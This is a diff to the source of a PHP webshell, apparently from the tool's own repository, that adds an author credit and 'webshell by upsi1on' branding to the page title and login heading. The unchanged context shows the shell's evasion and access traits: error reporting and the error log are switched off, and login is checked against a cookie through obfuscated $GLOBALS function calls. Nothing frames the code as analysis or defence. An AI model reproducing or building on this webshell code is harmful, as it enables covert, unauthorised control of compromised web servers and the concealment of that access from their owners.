@@ -1,5 +1,7 @@
 <?php
 
+# by upsi1on - thanks to my waifu (Zero Two)
+
 error_reporting (0);
 set_time_limit (0);
 @ini_set ("error_log", null);
@@ -62,7 +64,7 @@ if (@$GLOBALS[46] ($GLOBALS[47] ($_COOKIE["webshelLoginVerify"]), $password)) {
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Server</title>
+    <title>upsi1on</title>
     <style>
         body, input, button, a {
             color: white;
@@ -206,7 +208,7 @@ if (@!$GLOBALS[46] ($GLOBALS[47] ($_COOKIE["webshelLoginVerify"]), $password)) {
 ?>
 
     <center>
-        <h2></h2>
+        <h2>webshell by upsi1on</h2>
         <form method="post">
             <input type="password" name="password" placeholder="password">
             <button type="submit">&nbsp;submit&nbsp;</button>
@@ -774,6 +776,7 @@ function showFiles () {
         if ($dact == "") $dact = "-";
 
         $str .= "
+
     <tr class='trFl'>
         <td class='typeTd'>$type&nbsp;</td>
         <td>$a</td>
